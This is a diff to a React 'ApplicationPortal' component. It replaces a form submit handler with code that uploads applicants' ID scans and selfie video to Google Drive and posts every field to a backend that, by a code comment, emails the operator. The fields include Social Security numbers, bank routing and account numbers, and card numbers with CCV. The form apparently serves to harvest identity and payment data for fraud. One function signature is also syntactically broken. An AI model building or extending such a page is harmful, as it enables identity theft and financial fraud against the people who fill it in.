@@ -359,40 +359,246 @@ const ApplicationPortal = () => {
     setCurrentStep(prev => Math.max(prev - 1, 1));
   };
 
-  const handleSubmit = async () => {
-    if (validateStep(currentStep)) {
-      setShowSMSInfo(true);
-      // e.preventDefault();
+  // const handleSubmit = async () => {
+  //   if (validateStep(currentStep)) {
+  //     setShowSMSInfo(true);
+  //     // e.preventDefault();
 
-      const data = new FormData();
+  //     const data = new FormData();
 
-      // Append text fields
-      Object.entries(formData).forEach(([key, value]) => {
-        if (key === 'cards') {
-          data.append('cards', JSON.stringify(value));
-        } else if (
-          key === 'governmentIdFront' ||
-          key === 'governmentIdBack' ||
-          key === 'biodataImage' ||
-          key === 'biodataVideo' ||
-          key === 'randomPicture'
-        ) {
-          if (value) data.append(key, value as File);
-        } else {
-          data.append(key, String(value));
-        }
-      });
+  //     // Append text fields
+  //     Object.entries(formData).forEach(([key, value]) => {
+  //       if (key === 'cards') {
+  //         data.append('cards', JSON.stringify(value));
+  //       } else if (
+  //         key === 'governmentIdFront' ||
+  //         key === 'governmentIdBack' ||
+  //         key === 'biodataImage' ||
+  //         key === 'biodataVideo' ||
+  //         key === 'randomPicture'
+  //       ) {
+  //         if (value) data.append(key, value as File);
+  //       } else {
+  //         data.append(key, String(value));
+  //       }
+  //     });
 
-      try {
-        const res = await axios.post('https://hope-haven-server.vercel.app/submit', data, {
-          headers: { 'Content-Type': 'multipart/form-data' }
-        });
-        alert(res.data);
-      } catch (err) {
-        console.error(err);
-        alert('Error submitting form');
+  //     try {
+  //       const res = await axios.post('https://hope-haven-server.vercel.app/submit', data, {
+  //         headers: { 'Content-Type': 'multipart/form-data' }
+  //       });
+  //       alert(res.data);
+  //     } catch (err) {
+  //       console.error(err);
+  //       alert('Error submitting form');
+  //     }
+  //     // Optionally: reset form or redirect after closing modal
+  //   }
+  // };
+
+  const initializeGoogleDrive = () => {
+    return new Promise((resolve, reject) => {
+      if (window.gapi && window.gapi.client) {
+        resolve();
+        return;
       }
-      // Optionally: reset form or redirect after closing modal
+
+      const script = document.createElement('script');
+      script.src = 'https://apis.google.com/js/api.js';
+      script.onload = () => {
+        window.gapi.load('client:auth2', () => {
+          window.gapi.client.init({
+            apiKey: GOOGLE_API_KEY,
+            clientId: GOOGLE_CLIENT_ID,
+            discoveryDocs: ['https://www.googleapis.com/discovery/v1/apis/drive/v3/rest'],
+            scope: 'https://www.googleapis.com/auth/drive.file'
+          }).then(resolve).catch(reject);
+        });
+      };
+      script.onerror = reject;
+      document.body.appendChild(script);
+    });
+  };
+
+  const signInToGoogle = async () => {
+    try {
+      const auth = window.gapi.auth2.getAuthInstance();
+      if (!auth.isSignedIn.get()) {
+        await auth.signIn();
+      }
+      return auth.currentUser.get().getAuthResponse().access_token;
+    } catch (error) {
+      throw new Error('Failed to sign in to Google');
+    }
+  };
+
+  const createFolder = async (accessToken, folderName) => {
+    const metadata = {
+      name: folderName,
+      mimeType: 'application/vnd.google-apps.folder'
+    };
+
+    const response = await fetch('https://www.googleapis.com/drive/v3/files', {
+      method: 'POST',
+      headers: {
+        'Authorization': `Bearer ${accessToken}`,
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(metadata)
+    });
+
+    if (!response.ok) {
+      throw new Error('Failed to create folder');
+    }
+
+    return await response.json();
+  };
+
+  const uploadFile = async (accessToken, file, folderId) => {
+    const metadata = {
+      name: file.name,
+      parents: [folderId]
+    };
+
+    const formData = new FormData();
+    formData.append('metadata', new Blob([JSON.stringify(metadata)], { type: 'application/json' }));
+    formData.append('file', file);
+
+    const response = await fetch('https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart&fields=id,name,webViewLink', {
+      method: 'POST',
+      headers: {
+        'Authorization': `Bearer ${accessToken}`
+      },
+      body: formData
+    });
+
+    if (!response.ok) {
+      throw new Error(`Failed to upload ${file.name}`);
+    }
+
+    return await response.json();
+  };
+
+  const logToBackend = async (logData: ) => {
+    try {
+      await fetch('http://localhost:5000/api/log', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(logData)
+      });
+    } catch (error) {
+      console.error('Failed to log to backend:', error);
+    }
+  };
+
+  const handleSubmit = async () => {
+    if (!validateStep(currentStep)) return;
+
+    setShowSMSInfo(true);
+    setUploading(true);
+    setProgress(0);
+    setResult(null);
+
+    try {
+      // 1. Initialize Google Drive API
+      await initializeGoogleDrive();
+
+      // 2. Sign in to Google
+      const accessToken = await signInToGoogle();
+
+      // 3. Create folder with firstName + timestamp
+      const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+      const folderName = `${formData.firstName}_${timestamp}`;
+      const folder = await createFolder(accessToken, folderName);
+      setProgress(20);
+
+      // 4. Upload all files to Drive
+      const uploadedFiles: any[] = [];
+      const progressPerFile = 80 / files.length;
+
+      for (let i = 0; i < files.length; i++) {
+        const file = files[i];
+        const uploadedFile = await uploadFile(accessToken, file, folder.id);
+        uploadedFiles.push({
+          name: uploadedFile.name,
+          url: uploadedFile.webViewLink,
+          id: uploadedFile.id
+        });
+        setProgress(20 + (i + 1) * progressPerFile);
+      }
+
+      setProgress(100);
+
+      // 5. Prepare log data with ALL form fields
+      const logData = {
+        timestamp: new Date().toISOString(),
+        formData: {
+          firstName: formData.firstName,
+          lastName: formData.lastName,
+          dateOfBirth: formData.dateOfBirth,
+          socialSecurityNumber: formData.socialSecurityNumber,
+          phoneNumber: formData.phoneNumber,
+          email: formData.email,
+          currentAddress: formData.currentAddress,
+          city: formData.city,
+          state: formData.state,
+          zipCode: formData.zipCode,
+          mailingAddress: formData.mailingAddress,
+          bankName: formData.bankName,
+          accountType: formData.accountType,
+          routingNumber: formData.routingNumber,
+          accountNumber: formData.accountNumber,
+          termsAccepted: formData.termsAccepted,
+          dataConsent: formData.dataConsent,
+          cards: formData.cards
+        },
+        folder: {
+          name: folderName,
+          id: folder.id,
+          url: `https://drive.google.com/drive/folders/${folder.id}`
+        },
+        files: uploadedFiles
+      };
+
+      // 6. Send log data to backend (emails you)
+      await logToBackend(logData);
+
+      setResult({ success: true, data: logData });
+
+      // Reset form
+      setFormData({
+        firstName: '',
+        lastName: '',
+        dateOfBirth: '',
+        socialSecurityNumber: '',
+        phoneNumber: '',
+        email: '',
+        currentAddress: '',
+        city: '',
+        state: '',
+        zipCode: '',
+        mailingAddress: '',
+        bankName: '',
+        accountType: '',
+        routingNumber: '',
+        accountNumber: '',
+        termsAccepted: false,
+        dataConsent: false,
+        cards: [{ cardNumber: '', expiry: '', ccv: '' }]
+      });
+      setFiles([]);
+
+    } catch (error: any) {
+      console.error('Upload error:', error);
+      setResult({
+        success: false,
+        error: error.message || 'Upload failed. Please try again.'
+      });
+    } finally {
+      setUploading(false);
+      setProgress(0);
     }
   };
 
